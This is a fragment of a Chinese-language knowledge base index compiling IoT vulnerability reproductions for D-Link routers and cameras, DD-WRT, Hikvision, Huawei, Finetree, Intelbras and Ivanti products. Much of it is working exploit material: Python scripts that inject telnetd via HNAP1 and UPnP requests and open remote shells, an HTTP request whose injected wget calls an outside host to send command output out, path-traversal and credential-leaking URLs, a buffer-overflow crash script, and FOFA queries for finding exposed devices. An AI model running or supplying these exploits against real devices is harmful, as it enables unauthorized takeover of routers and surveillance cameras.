这个问题存在于DIR823GA1固件FW102B03版本，网关(Gateway\")的选项设置静态路由(SetStaticRouterSettings)，IP地址选项(IPAddress\")，存在命令注入。 漏洞POC 选择IP地址(IPAddress)提交信息，在数据包修改。 原文地址:https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/DIR-823G-v2.pdf Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:10 "},"IOT安全/D-Link/（CVE-2019-15529）D-Link DIR-823G/（CVE-2019-15529）D-Link DIR-823G.html":{"url":"IOT安全/D-Link/（CVE-2019-15529）D-Link DIR-823G/（CVE-2019-15529）D-Link DIR-823G.html","title":"（CVE-2019-15529）D-Link DIR-823G","keywords":"","body":"一、漏洞简介 D-Link DIR-823G是中国台湾友讯（D-Link）公司的一款无线路由器。 使用1.0.2B05版本固件的D-Link DIR-823G中的HNAP1存在命令注入漏洞。该漏洞源于外部输入数据构造可执行命令过程中，网络系统或产品未正确过滤其中的特殊元素。攻击者可利用该漏洞执行非法命令。 二、漏洞影响 DIR823GA1_FW102B05 三、复现过程 1.下载D-Link DIR-823G固件，http://support.dlink.com.cn/ProductInfo.aspx?m=DIR-823G 2.在固件版本为V1.0.2B05的D-Link DIR823G设备上存在一个问题，能偶通过用户名字段中注入命令进行登录。 3.攻击载荷 4.漏洞细节 5.写入文件 参考链接 https://github.com/TeamSeri0us/pocs/blob/master/iot/dlink/823G-102B05-1.pdf Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:10 "},"IOT安全/D-Link/（CVE-2019-16920）D-Link rce/（CVE-2019-16920）D-Link rce.html":{"url":"IOT安全/D-Link/（CVE-2019-16920）D-Link rce/（CVE-2019-16920）D-Link rce.html","title":"（CVE-2019-16920）D-Link rce","keywords":"","body":"一、漏洞简介 D-Link设备中出现未经身份验证的命令注入漏洞(FG-VD-19-117/CVE-2019-16920)，该漏洞可造成远程代码执行。 二、漏洞影响 DIR-655 ，DIR-866L，DIR-652，DHP-1565，DIR-855L，DAP-1533，DIR-862L，DIR-615，DIR-835，DIR-825等 三、复现过程 poc 攻击者可以利用该漏洞将任意字符串发送到“PingTest”网关接口来实现命令注入。 POST /apply_sec.cgi HTTP/1.1 Host: 192.168.232.128 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:69.0) Gecko/20100101 Firefox/69.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Content-Type: application/x-www-form-urlencoded Content-Length: 131 Connection: close Referer: http://192.168.232.128/login_pic.asp Cookie: uid=1234123 Upgrade-Insecure-Requests: 1 html_response_page=login_pic.asp&action=ping_test&ping_ipaddr=127.0.0.1%0awget%20-P%20/tmp/%20http://45.76.148.31:4321/?$(echo 1234) “该漏洞始于一次错误的身份验证过程。当我们要进入管理页面时，需要执行登录操作。此时，我们会对apply_sec.cgi页面发出POST请求，其中包含一个操作ping_test。研究后发现，我们可通过参数ping_ipaddr执行命令注入。虽然响应是返回登录页面，但操作ping_test仍然执行了，我们通过参数ping_ipaddr注入的命令echo 1234成功执行，并将结果发送回我们的服务器。” Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:11 "},"IOT安全/D-Link/（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞/（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞.html":{"url":"IOT安全/D-Link/（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞/（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞.html","title":"（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞","keywords":"","body":"（CVE-2019-7297）D-Link DIR-823G 命令注入漏洞 一、漏洞简介 D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。GetNetworkTomographyResult函数中调用system函数，执行的内容中包括不受信任的用户输入Address字段，攻击者可以远程执行任意命令。 二、漏洞影响 D-Link DIR 823G 1.02B03及之前的版本 三、复现过程 漏洞分析 漏洞原理中提到的GetNetworkTomographyResult函数是在goahead二进制文件中实现的。在function_list中找到对应的函数地址。 GetNetworkTomographyResult获取address，number，size参数，作为ping的参数。 ping address -c number -w number -s size > /tmp/ping.txt 2>>/tmp/ping.txt 但在system之前并没有对这些外来参数进行检查，如果address为;telnetd;就能启动Telnet服务。可以看出这些参数都是通过apmib_get获取的，那么在之前一定有apmib_set进行设置，在IDA中查找关键字0x1b72，0x1b73，0x1b73，定位到apmib_set的位置，结合ghidra的反汇编代码，确定在SetNetworkTomographySettings函数中可以对这些参数进行设置。 poc import requests from pwn import * IP='192.168.0.1' headers = requests.utils.default_headers() headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/SetNetworkTomographySettings\"' headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"Accept\"]=\"*/*\" headers[\"Accept-Encoding\"]=\"gzip, deflate\" headers[\"Accept-Language\"]=\"zh-CN,zh;q=0.9,en;q=0.8\" payload = '\\ \\ \\ ;telnetd;\\ 4\\ 4\\ ' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/GetNetworkTomographyResult\"' payload = '\\ \\ \\ ' r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text p=remote(IP,23) p.interactive() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:08 "},"IOT安全/D-Link/（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞/（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞.html":{"url":"IOT安全/D-Link/（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞/（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞.html","title":"（CVE-2019-7298）D-Link DIR-823G 命令注入漏洞","keywords":"","body":"一、漏洞简介 D-Link DIR 823G 1.02B03及之前的版本中存在命令注入漏洞，攻击者可通过发送带有shell元字符的特制/HNAP1请求利用该漏洞执行任意的操作系统命令。在HNAP API函数处理请求之前，system函数执行了不可信的命令，触发该漏洞。 二、漏洞影响 D-Link DIR 823G 1.02B03及之前的版本 三、复现过程 漏洞分析 在每次内核启动之后将启动init进程，init进程的启动时根据/etc/inittab这个文件赖在不同运行级别启动相应的进程或执行相应的操作。其中sysinit代表系统的初始化，只有系统开机或重新启动的时候，后面对应的process才会执行一次。 ::sysinit:/etc/init.d/rcS 在rcS中，先执行一些列mkdir和设置，执行了goahead。 goahead 是一个开源的 web 服务器，用户的定制性非常强。可以通过一些 goahead 的 api定义 url处理函数和可供 asp 文件中调用的函数，具体可以看看官方的代码示例和网上的一些教程。 goahead的websUrlHandlerDefine函数允许用户自定义不同url的处理函数： websUrlHandlerDefine(T(\"/HNAP1\"), NULL, 0, websHNAPHandler, 0); websUrlHandlerDefine(T(\"/goform\"), NULL, 0, websFormHandler, 0); websUrlHandlerDefine(T(\"/cgi-bin\"), NULL, 0, websCgiHandler, 0); 以上代表/HNAP1的请求交给websHNAPHandler函数处理，/gofrom的请求交给websFormHandler函数处理，/cgi-bin的请求交websCgiHandler函数处理。这些处理函数有统一的参数： int (*fn)(webs_t wp, char_t *url, char_t *path, char_t *query) wp Web server connection handle. url Request URL. path Request path portion of the URL. query Query string portion of the URL. 先了解/HNAP1请求的处理函数，在goahead中查找“HNAP1”字符串并通过xref定位处理函数sub_42383c sub_4238c主要通过遍历全局的函数表来处理HNAP1接受的不同请求。function_list中每个元素的前四个字节为函数名，后四个字节为对应的函数地址。当找到在function_list中找到函数名与请求相同的字符串时，向/var/hnaplog中记录param_7的值，这个值但从汇编不太能看出，hackedbylh指出是post的报文，在运行过程中查看/var/hnaplog能猜出来。之后调用对应的函数地址处理相关请求。 这里无论处理请求的函数名是什么，在找到之后会通过snprintf输入字符且未做检查，之后直接system执行，存在命令注入漏洞。如果post请求是'/bin/telnetd'，就会先开启telnet服务器，再讲字符写入hnaplog。 另外需要注意，post的数据要加上引号，因为echo '%s' > /var/hnaplog中本身带了单引号，如果只是/bin/telnet，相当于 echo '`/bin/telnet`' > /var/hnaplog 由于命令由引号括起，会当做字符串处理，不会执行命令 而 echo ''`/bin/telnet`'' > /var/hnaplog post中的两个引号分别与自带的两个引号组合，反引号没有嵌套在单引号中，会当做命令执行。 poc import requests from pwn import * IP='192.168.0.1' command =\"'`/bin/telnetd`'\" length = len(command) headers = requests.utils.default_headers() headers[\"Content-Length\"]=str(length) headers[\"User-Agent\"] = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36\" headers[\"SOAPAction\"] = '\"http://purenetworks.com/HNAP1/Login\"'#此处的Login可以替换为任何在function_list中的函数名 headers[\"Content-Type\"] = \"text/xml; charset=UTF-8\" headers[\"Accept\"]=\"*/*\" headers[\"Accept-Encoding\"]=\"gzip, deflate\" headers[\"Accept-Language\"]=\"zh-CN,zh;q=0.9,en;q=0.8\" payload = command r = requests.post('http://'+IP+'/HNAP1/', headers=headers, data=payload) print r.text p=remote(IP,23) p.interactive() Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:09 "},"IOT安全/D-Link/（CVE-2019–17621）D-Link DIR-859 rce/（CVE-2019–17621）D-Link DIR-859 rce.html":{"url":"IOT安全/D-Link/（CVE-2019–17621）D-Link DIR-859 rce/（CVE-2019–17621）D-Link DIR-859 rce.html","title":"（CVE-2019–17621）D-Link DIR-859 rce","keywords":"","body":"D-Link DIR-859 —未经身份验证的RCE(CVE-2019–17621) 研究人员 Miguel Mendez Z.-（s1kr10s） Pablo Pollanco-（secenv） 技术细节 型号：DIR-859 固件版本：1.06b01 Beta01，1.05 架构：MIPS 32位 脆弱性 远程执行代码（未经身份验证，LAN） 受影响的产品 漏洞分析 在用于管理UPnP请求的代码中发现了远程执行代码漏洞。下面我们将简要描述UPnP协议。 什么是UPnP？ UPnP是专用网络中设备之间的通信协议。它的主要功能之一是自动自动打开端口，而无需用户为每个程序手动配置路由器。它在用于视频游戏的系统中特别有用，因为它是动态工作的，而且正如我们之前所说的，它是自主的。 回到分析，我们粗略地显示了二进制可执行文件/ htdocs / cgibin（固件文件DIR859Ax_FW106b01_beta01.bin和DIR859Ax_FW105b03.bin）中的genacgi_main（）函数，该漏洞包含使我们能够执行代码的漏洞，并且达到下图所示的代码所必须满足的条件。 如下所示，sprintf（）设置了一个包含所有值的缓冲区，包括带有值的参数“？service = *”，这就是我们将在此处跟踪的内容。 为了更好地了解漏洞的发生方式，我们在下面显示genacgi_main（）函数的反编译伪代码的一部分（为清楚起见，修改了变量名）。 /* The method has to be SUBSCRIBE to reach the buggy code */ metodo = getenv(\"REQUEST_METHOD”); request_uri = getenv(\"REQUEST_URI”); request_uri_0x3f = strchr(request_uri,0x3f); cmp_service = strncmp(request_uri_0x3f,\"?service=\",9) if (cmp_service != 0) { return -1; } /* more code */ valor_subscribe = strcasecmp(metodo,\"SUBSCRIBE\"); request_uri_0x3f = request_uri_0x3f + 9; if (valor_subscribe != 0) { /* more code */ } server_id_3 = getenv(\"SERVER_ID\"); http_sid_2 = getenv(\"HTTP_SID\"); http_callback_2 = getenv(\"HTTP_CALLBACK\"); http_timeout = getenv(\"HTTP_TIMEOUT\"); http_nt_2 = getenv(\"HTTP_NT\"); remote_addr = getenv(\"REMOTE_ADDR”); /* more code */ if (cmp_http_callback == 0) { /* more code */ str_http_callback_0x2f = strchr(http_callback_2 + 7, 0x2f); if (str_http_callback_0x2f != (char *)0x0) { get_pid_1 = getpid(); /* vulnerable code */ sprintf(buffer_8,\"%s\\nMETHOD=SUBSCRIBE\\nINF_UID=%s\\nSERVICE=%s\\nHOST=%s\\nURI=/%s\\nTIMEOUT=%d\\nREMOTE=%s\\nSHELL_FILE=%s/%s_%d.sh\", \"/htdocs/upnp/run.NOTIFY.php\", server_id_3, request_uri_0x3f, http_callback_2 + 7, str_http_callback_0x2f + 1, flag_2, remote_addr, \"/var/run\", request_uri_0x3f, get_pid_1); /* send the data */ xmldbc_ephp(0,0,buffer_8,(int)stdout); } /* more code */ 然后，使用xmldbc_ephp（）（最终调用send（））将“ buffer_8”中包含的数据发送到PHP。 int xmldbc_ephp(int 0,int 0_,char *buffer_8,int stdout) { size_t len_buffer; int ret_prepre; len_buffer = strlen(buffer_8); len_buffer._2_2_ = (short)len_buffer; ret_prepre = [send(socket,buffer_8,(uint)len_buffer,0x4000);] return ret_prepre; } 如代码所示，URL是从环境变量“ REQUEST_URI”获得的，然后按以下方式验证其结构： request_uri = \"http://IP:PORT/*?service=file_name\" request_uri_0x3f = strchr(request_uri,0x3f); ————strchr()———— + 9 ———— we control the filename with the variable => request_uri_0x3f 通过调用strchr（）和strncmp（），代码检查是否存在值“ 0x3f”（=字符“？”）和字符串“？service = ”；之后，它将验证请求方法：如果调用SUBSCRIBE，则代码会将9个字节的偏移量添加到request_uri_0x3f指针，并将其放置在文件名所在的位置。初始化其他一些变量，最后使用sprintf（）连接许多变量的值，填充一个缓冲区，该缓冲区设置要传递的新变量，其中“ SHELLFILE”以格式字符串“％s*％d.sh”传递”，用于为新的Shell脚本命名。 将数据复制到“ buffer_8”缓冲区后，将在内存中进行如下设置： 缓冲区中包含的数据现在由PHP文件“ run.NOTIFY.php”处理，在此再次验证请求方法。 文件：run.NOTIFY.php $gena_path = XNODE_getpathbytarget($G_GENA_NODEBASE, \"inf\", \"uid\", $INF_UID, 1); $gena_path = $gena_path.\"/\".$SERVICE; GENA_subscribe_cleanup($gena_path); /* IGD services */ if ($SERVICE == \"L3Forwarding1\") $php = \"NOTIFY.Layer3Forwarding.1.php\"; else if ($SERVICE == \"OSInfo1\") $php = \"NOTIFY.OSInfo.1.php\"; else if ($SERVICE == \"WANCommonIFC1\") $php = \"NOTIFY.WANCommonInterfaceConfig.1.php\"; else if ($SERVICE == \"WANEthLinkC1\") $php = \"NOTIFY.WANEthernetLinkConfig.1.php\"; else if ($SERVICE == \"WANIPConn1\") $php = \"NOTIFY.WANIPConnection.1.php\"; /* WFA services */ else if ($SERVICE == \"WFAWLANConfig1\") $php = \"NOTIFY.WFAWLANConfig.1.php\"; if ($METHOD == \"SUBSCRIBE\") { if ($SID == \"\") GENA_subscribe_new($gena_path, $HOST, $REMOTE, $URI, $TIMEOUT, $SHELL_FILE, \"/htdocs/upnp/\".$php, $INF_UID); else GENA_subscribe_sid($gena_path, $SID, $TIMEOUT); } else if ($METHOD == \"UNSUBSCRIBE\") { GENA_unsubscribe($gena_path, $SID); } 该脚本调用PHP函数“ GENA_subscribe_new（）”，并向其传递在cgibin程序的genacgi_main（）函数中获得的变量，包括“ SHELL_FILE”变量。如前面的genacgi_main（）代码所示，此变量用于设置文件名的一部分。 文件：gena.php，函数GENA_subscribe_new（） function GENA_subscribe_new($node_base, $host, $remote, $uri, $timeout, $shell_file, $target_php, $inf_uid) { anchor($node_base); $count = query(\"subscription#\"); $found = 0; /* find subscription index & uuid */ foreach (\"subscription\") { if (query(\"host\")==$host && query(\"uri\")==$uri) { $found = $InDeX; break; } } if ($found == 0) { $index = $count + 1; $new_uuid = \"uuid:\".query(\"/runtime/genuuid\"); } else { $index = $found; $new_uuid = query(\"subscription:\".$index.\"/uuid\"); } /* get timeout */ if ($timeout==0 || $timeout==\"\") { $timeout = 0; $new_timeout = 0; } else { $new_timeout = query(\"/runtime/device/uptime\") + $timeout; } /* set to nodes */ set(\"subscription:\".$index.\"/remote\", $remote); set(\"subscription:\".$index.\"/uuid\", $new_uuid); set(\"subscription:\".$index.\"/host\", $host); set(\"subscription:\".$index.\"/uri\", $uri); set(\"subscription:\".$index.\"/timeout\", $new_timeout); set(\"subscription:\".$index.\"/seq\", \"1\"); GENA_subscribe_http_resp($new_uuid, $timeout); GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $new_uuid); } 如我们所见，“ GENA_subscribe_new（）”函数不会修改$ shell_file变量。 我们在这里可以看到两个函数：“ GENA_subscribe_http_resp（）”，它仅加载要在UPnP响应中传递的标头；“ GENA_notify_init（）”，其接收“ $ shell_file”变量，我们一直在跟踪。 文件：gena.php，函数GENA_notify_init（） ​```cpp function GENA_notify_init($shell_file, $target_php, $inf_uid, $host, $uri, $sid) { $inf_path = XNODE_getpathbytarget(\"\", \"inf\", \"uid\", $inf_uid, 0); if ($inf_path==\"\") { TRACE_debug(\"can't find inf_path by $inf_uid=\".$inf_uid.\"!\"); return \"\"; } $phyinf = PHYINF_getifname(query($inf_path.\"/phyinf\")); if ($phyinf == \"\") { TRACE_debug(\"can't get phyinf by $inf_uid=\".$inf_uid.\"!\"); return \"\"; } $upnpmsg = query(\"/runtime/upnpmsg\"); if ($upnpmsg == \"\") $upnpmsg = \"/dev/null\"; fwrite(w, $shell_file, \"#!/bin/sh\\n\". 'echo \"[$0] ...\" > '.$upnpmsg.\"\\n\". \"xmldbc -P \".$target_php. \" -V INF_UID=\".$inf_uid. \"-V HDR_URL=\".$uri. \" -V HDR_HOST=\".$host. \" -V HDR_SID=\".$sid. \" -V HDR_SEQ=0\". \" | httpc -i \".$phyinf.\" -d \\\"\".$host.\"\\\" -p TCP > \".$upnpmsg.\"\\n\" ); fwrite(a, $shell_file, \"rm -f \".$shell_file.\"\\n\"); /* Here, the code is injected as filename */ } 这是“ SHELL_FILE”最终结束的地方。它用作通过调用PHP函数“ fwrite（）”创建的新文件的名称的一部分。此函数使用了两次：第一个创建文件，从我们控制的SHELL_FILE变量中获取文件名，并连接getpid（）的输出，如下所示： Request: http://IP:PORT/*?service=file_name System: /var/run/nombre_archivo_13567.sh 第二次对“ fwrite（）”的调用将向该文件添加新行，其中包含对“ rm”系统命令的调用以删除自身。 为了利用这一点，我们只需要插入一个用反引号引起的系统命令（$ command），然后将其注入到shell脚本中，并为我们提供RCE；“ rm”命令将失败，因为文件名字符串将被“ rm”返回的输出（空字符串）替换。 Request: http://IP:PORT/*?service=`ping 192.168.0.20` System: /var/run/`ping 192.168.0.20`_13567.sh Run: rm -f `ping 192.168.0.20`_13467.sh 利用PoC 综上所述，我们编写了一个功能脚本来利用此RCE。 import socket import os from time import sleep # Exploit By Miguel Mendez & Pablo Pollanco def httpSUB(server, port, shell_file): print('\\n[*] Connection {host}:{port}').format(host=server, port=port) con = socket.socket(socket.AF_INET, socket.SOCK_STREAM) request = \"SUBSCRIBE /gena.cgi?service=\" + str(shell_file) + \" HTTP/1.0\\n\" request += \"Host: \" + str(server) + str(port) + \"\\n\" request += \"Callback: \\n\" request += \"NT: upnp:event\\n\" request += \"Timeout: Second-1800\\n\" request += \"Accept-Encoding: gzip, deflate\\n\" request += \"User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\\n\\n\" sleep(1) print('[*] Sending Payload') con.connect((socket.gethostbyname(server),port)) con.send(request.encode()) results = con.recv(4096) sleep(1) print('[*] Running Telnetd Service') sleep(1) print('[*] Opening Telnet Connection\\n') sleep(2) os.system('telnet ' + str(server) + ' 9999') serverInput = raw_input('IP Router: ') portInput = 49152 httpSUB(serverInput, portInput, '`telnetd -p 9999 &`') 借助此漏洞，我们接下来可以启动telnet服务以维持访问权限。Boom！ 视频 https://youtu.be/Q1HC5ExoE30 分析和利用：路由器D-LINK RCE 原文地址：https://medium.com/@s1kr10s/d-link-dir-859-rce-unautenticated-cve-2019-17621-en-d94b47a15104 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:12 "},"IOT安全/D-Link/（CVE-2019–20213）D-Link DIR-859 rce/（CVE-2019–20213）D-Link DIR-859 rce.html":{"url":"IOT安全/D-Link/（CVE-2019–20213）D-Link DIR-859 rce/（CVE-2019–20213）D-Link DIR-859 rce.html","title":"（CVE-2019–20213）D-Link DIR-859 rce","keywords":"","body":"一、漏洞简介 二、漏洞影响 三、复现过程 import requests # Miguel Mendez Z. FILES = [\"vpnconfig.php\"] IP = \"192.168.0.1\" PORT = \"80\" headers = {'content-type': 'application/x-www-form-urlencoded'} print \"\\n-----------VPN-------------\\n\" url_vpn = 'http://{ip}:{port}/{file1}?pwnd=%0a'.format(ip=IP, port=PORT, file1=FILES[0]) print(requests.get(url_vpn).text) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:12 "},"IOT安全/D-Link/（CVE-2020-25078）D-Link DCS系列监控 账号密码信息泄露漏洞/（CVE-2020-25078）D-Link DCS系列监控 账号密码信息泄露漏洞.html":{"url":"IOT安全/D-Link/（CVE-2020-25078）D-Link DCS系列监控 账号密码信息泄露漏洞/（CVE-2020-25078）D-Link DCS系列监控 账号密码信息泄露漏洞.html","title":"（CVE-2020-25078）D-Link DCS系列监控 账号密码信息泄露漏洞","keywords":"","body":"D-Link DCS系列监控 账号密码信息泄露漏洞 CVE-2020-25078 漏洞描述 D-Link DCS系列监控 通过访问特定的URL得到账号密码信息，攻击者通过漏洞进入后台可以获取视频监控页面 漏洞影响 DCS-2530L DCS-2670L DCS-4603 DCS-4622 DCS-4701E DCS-4703E DCS-4705E DCS-4802E DCS-P703 FOFA app=\"D_Link-DCS-2530L\" 漏洞复现 访问登录页面如下 出现漏洞的 Url 为, 其中泄露了账号密码 http://xxx.xxx.xxx.xxx/config/getuser?index=0 使用泄露的账号密码登陆系统 Goby & POC D-Link DCS系列监控 账号密码信息泄露漏洞 CNVD-2020-25078 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:13 "},"IOT安全/D-Link/D-Link Dir-645 getcfg.php 账号密码泄露漏洞/D-Link Dir-645 getcfg.php 账号密码泄露漏洞.html":{"url":"IOT安全/D-Link/D-Link Dir-645 getcfg.php 账号密码泄露漏洞/D-Link Dir-645 getcfg.php 账号密码泄露漏洞.html","title":"D-Link Dir-645 getcfg.php 账号密码泄露漏洞","keywords":"","body":"D-Link Dir-645 getcfg.php 账号密码泄露漏洞 漏洞描述 D-Link DIR-868L B1-2.03和DIR-817LW A1-1.04路由器上有一些不需要身份验证的Web界面。攻击者可以通过SERVICES的DEVICE.ACCOUNT值以及AUTHORIZED_GROUP = 1％0a来获取getcfg.php的路由器的用户名和密码（以及其他信息）。这可用于远程控制路由器。 漏洞影响 D-Link Dir 系列多个版本 FOFA app=\"D_Link-DIR-868L\" 漏洞复现 登录页面如下 发送如下请求包 POST /getcfg.php HTTP/1.1 Host: Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36 Content-Length: 61 SERVICES=DEVICE.ACCOUNT&attack=ture%0D%0AAUTHORIZED_GROUP%3D1 获取到路由器账号密码即可登录后台 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:04 "},"IOT安全/DD-WRT/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137.html":{"url":"IOT安全/DD-WRT/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137/DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137.html","title":"DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137","keywords":"","body":"DD-WRT UPNP缓冲区溢出漏洞 CVE-2021-27137 漏洞描述 默认情况下，DD-WRT中的UPNP处于禁用状态，并且仅在内部网络接口上侦听。 UPNP本质上是未经身份验证的UDP形式的协议–由于无法对协议强制执行身份验证，因此它既易于使用又具有不安全性。 如果DD-WRT启用了UPNP服务，则坐在存在DD-WRT设备的LAN上的远程攻击者可以通过发送一个过长的uuid值来触发缓冲区溢出。 根据部署DD-WRT的平台的不同，可能存在缓解措施，也可能没有缓解措施，例如ASLR等，这使得可利用性取决于安装DD-WRT的平台。 漏洞影响 DD-WRT 漏洞复现 通过查看源代码，ssdp.c可以很容易地发现有问题的代码： 用户提供的数据的未绑定副本被复制到缓冲区中，该缓冲区的大小限制为128个字节。 由于默认情况下未启用UPNP服务，因此重新创建漏洞的第一步是启用将自动启动该服务的服务 启动PoC脚本将触发upnp服务崩溃，这可以在启动以下python脚本几秒钟后看到 漏洞利用POC import socket target_ip = \"192.168.15.124\" # IP Address of Target off = \"D\"*164 ret_addr = \"AAAA\" payload = off + ret_addr packet = \\ 'M-SEARCH * HTTP/1.1\\r\\n' \\ 'HOST:239.255.255.250:1900\\r\\n' \\ 'ST:uuid:'+payload+'\\r\\n' \\ 'MX:2\\r\\n' \\ 'MAN:\"ssdp:discover\"\\r\\n' \\ '\\r\\n' s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP) s.sendto(packet.encode(), (target_ip, 1900) ) Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:14 "},"IOT安全/Finetree-5MP-摄像机/Finetree-5MP-摄像机未授权任意用户添加/Finetree-5MP-摄像机未授权任意用户添加.html":{"url":"IOT安全/Finetree-5MP-摄像机/Finetree-5MP-摄像机未授权任意用户添加/Finetree-5MP-摄像机未授权任意用户添加.html","title":"Finetree-5MP-摄像机未授权任意用户添加","keywords":"","body":"Finetree-5MP-摄像机未授权任意用户添加 漏洞描述 Finetree-5MP-摄像机未授权任意用户添加 漏洞影响 Finetree-5MP-摄像机 FOFA app=\"Finetree-5MP-Network-Camera\" 漏洞复现 登录界面如下： 首先可以尝试一下弱口令admin/admin，很多都存在。 若不存在则访问漏洞URL进行用户添加： /quicksetup/user_pop.php?method=add Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:15 "},"IOT安全/HIKVISION/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544.html":{"url":"IOT安全/HIKVISION/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544/HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544.html","title":"HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544","keywords":"","body":"HIKVISION 流媒体管理服务器 后台任意文件读取漏洞 CNVD-2021-14544 漏洞描述 杭州海康威视系统技术有限公司流媒体管理服务器存在弱口令漏洞，攻击者可利用该漏洞登录后台通过文件遍历漏洞获取敏感信息 漏洞影响 HIKVISION 流媒体管理服务器 FOFA title=\"流媒体管理服务器\" 漏洞复现 登录页面如下， 默认账号密码为 admin/12345 POC如下，访问如下Url下载 system.ini文件 http://xxx.xxx.xxx.xxx/systemLog/downFile.php?fileName=../../../../../../../../../../../../../../../windows/system.ini 成功读取 C:/windows/system.ini Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:16 "},"IOT安全/Huawei/（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞/（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞.html":{"url":"IOT安全/Huawei/（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞/（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞.html","title":"（CVE-2016-6158）华为WS331a产品管理页面存在CSRF漏洞","keywords":"","body":"一、漏洞简介 HuaweiWS331a是中国华为（Huawei）公司的一款迷你无线路由器。使用WS331a-10V100R001C01B112之前版本软件的HuaweiWS331a路由器的管理界面存在跨站请求伪造漏洞。远程攻击者可通过提交特制的请求利用该漏洞恢复出厂设置或重启设备。 二、漏洞影响 WS331a-10 V100R001C02B017SP01及之前版本 三、复现过程 POC实现代码如下： 当管理员登陆后，打开如下poc页面，WS331a设备将重启。 document.forms[0].submit(); 当管理员登陆后，打开如下poc页面，WS331a设备将恢复初始化配置。设备自动重启后不需要密码即可连接热点，并使用amdin/admin对设备进行管理控制。 document.forms[0].submit(); Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:17 "},"IOT安全/Intelbras Wireless/Intelbras Wireless 未授权与密码泄露/Intelbras Wireless 未授权与密码泄露.html":{"url":"IOT安全/Intelbras Wireless/Intelbras Wireless 未授权与密码泄露/Intelbras Wireless 未授权与密码泄露.html","title":"Intelbras Wireless 未授权与密码泄露","keywords":"","body":"Intelbras Wireless 未授权与密码泄露 漏洞描述 Intelbras IWR 3000N是波兰Intelbras公司的一款无线路由器。 Intelbras WIN 300 and WRN 342 devices 2021-01-04版本及之前版本存在安全漏洞，该漏洞允许远程攻击者通过读取HTML源代码中的def wireless spassword行来发现凭据。 漏洞影响 win_300_firmware 等 FOFA body=\"def_wirelesspassword\" 漏洞复现 登录页面如下 查看网页源代码，泄露了配置密码 测试了一下其他的，发现出现账号密码的原因为访问的是路由的配置页面，配置后获取后台权限 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 19:46:18 "},"IOT安全/Ivanti Avalanche/Ivanti Avalanche目录便利任意文件漏洞读取/Ivanti Avalanche目录便利任意文件漏洞读取.html":{"url":"IOT安全/Ivanti Avalanche/Ivanti Avalanche目录便利任意文件漏洞读取/Ivanti Avalanche目录便利任意文件漏洞读取.html","title":"Ivanti Avalanche目录便利任意文件漏洞读取","keywords":"","body":"Ivanti Avalanche目录便利任意文件漏洞读取.md 漏洞描述 Ivanti Avalanche是美国Ivanti公司的一套企业移动设备管理系统。该系统主要用于管理智能手机、平板电脑等设备。该漏洞存在于读取存储的头像图片位置，未进行限制格式与目录，造成了任意文件读取。 漏洞影响 Avalanche Premise 6.3.2 for Windows v6.3.2.3490 关键代码 String paramImageFilePath = 